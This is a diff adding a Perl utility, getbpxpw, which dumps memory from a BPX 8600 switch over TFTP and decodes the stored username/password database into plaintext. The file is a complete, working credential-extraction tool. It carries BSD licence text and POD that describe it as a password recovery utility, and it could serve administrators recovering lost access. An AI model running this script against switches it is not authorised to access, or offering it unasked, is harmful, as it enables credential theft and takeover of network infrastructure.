@@ -1,0 +1,189 @@
+#!perl
+#############################################################################
+# $Id: getbpxpw,v 1.1 2006/10/17 13:56:55 wendigo Exp $
+#############################################################################
+# Author:   Mark Rogaski <mrogaski@cpan.org>
+# Revision: $Revision: 1.1 $
+# Date:     $Date: 2006/10/17 13:56:55 $
+#
+#############################################################################
+# 
+# Copyright (c) 2006, Mark Rogaski, C<mrogaski@cpan.org>.
+# All rights reserved.
+# 
+# Redistribution and use in source and binary forms, with or without
+# modification, are permitted provided that the following conditions
+# are met:
+# 
+#     Redistributions of source code must retain the above copyright notice,
+#     this list of conditions and the following disclaimer.
+# 
+#     Redistributions in binary form must reproduce the above copyright notice,
+#     this list of conditions and the following disclaimer in the documentation
+#     and/or other materials provided with the distribution.
+# 
+#     The name of the author may not be used to endorse or promote products
+#     derived from this software without specific prior written permission.
+# 
+# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+# AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+# IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+# DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE
+# FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+# DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
+# SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
+# CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
+# OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
+# OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+# 
+#############################################################################
+#
+# $Log: getbpxpw,v $
+# Revision 1.1  2006/10/17 13:56:55  wendigo
+# Initial revision
+#
+#
+#############################################################################
+use 5.6.1;
+use strict;
+use warnings;
+
+use IO::File;
+
+use Net::TFTP;
+
+use vars qw($NAME $VERSION);
+
+#
+# administrivia
+#
+$NAME    = 'getbpxpw';
+$VERSION = '0.1.00';
+
+sub BUFFER_SIZE () { 1024; }
+my %Name_DB;
+my $filename = 'mem.30000.4ffff';
+
+my $nodename = shift;
+
+#
+# main line code
+#
+my $tftp = Net::TFTP->new($nodename, Mode => 'octet', BlockSize => 1024)
+    or die "cannot connect to $nodename via TFTP: $!\n";
+my $fh = $tftp->get($filename) or die "cannot dump memory: "
+	. $tftp->error() . "\n";
+
+my $prefix = '';
+my $suffix = '';
+LOOP: while ($fh->sysread($suffix, BUFFER_SIZE)) {
+    my $buffer = $prefix . $suffix;
+    while ($buffer =~ /\0\x09([A-Za-z0-9]+)\0.?\0*([\x01-\x10][^\0]+)\0/g) {
+	my $uid = $1;
+	my($index, @in) = map { ord } split //, $2;
+	my $out = '';
+	my $k = 15;
+	foreach my $c (@in) {
+	    my $d = ($c + $k) % 0x7f;
+	    $k -= 3;
+	    $out .= chr $d;
+	}
+	$Name_DB{"$uid"} = $out unless exists $Name_DB{"$uid"};
+    }
+    if ($buffer =~ /\x09\x00{32}/) { last LOOP; }
+    $prefix = $suffix;
+}
+
+$fh->close();
+
+#
+# display the results
+#
+foreach my $username (sort keys %Name_DB) {
+    print "$username => $Name_DB{$username}\n";
+}
+
+__END__
+
+=head1 NAME
+
+getbpxpw -- utility to recover BPX user passwords
+
+
+=head1 SYNOPSIS
+
+  getbpxpw NODE
+
+
+=head1 DESCRIPTION
+
+This utility performs a memory dump on a BPX 8600 and extracts the
+username/password database.
+
+
+=head1 ARGUMENTS
+
+
+=head2 NODE
+
+The name of the BPX to extract passwords from.
+
+
+=head1 OPTIONS
+
+None.
+
+
+=head1 NOTES
+
+This utility uses a simplified version of the password "decryption" as
+described by Jay Masuda.
+
+
+=head1 AUTHOR
+
+Mark Rogaski, C<mrogaski@cpan.org>
+
+
+=head1 LICENCE AND COPYRIGHT
+
+Copyright (c) 2006, Mark Rogaski, C<mrogaski@cpan.org>.
+All rights reserved.
+
+Redistribution and use in source and binary forms, with or without
+modification, are permitted provided that the following conditions
+are met:
+
+=over 4
+
+=item
+
+Redistributions of source code must retain the above copyright notice,
+this list of conditions and the following disclaimer.
+
+=item
+
+Redistributions in binary form must reproduce the above copyright notice,
+this list of conditions and the following disclaimer in the documentation
+and/or other materials provided with the distribution.
+
+=item
+
+The name of the author may not be used to endorse or promote products
+derived from this software without specific prior written permission.
+
+=back
+
+THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
+AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
+IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
+DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE LIABLE
+FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
+DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
+SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
+CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
+OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
+OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
+
+
+
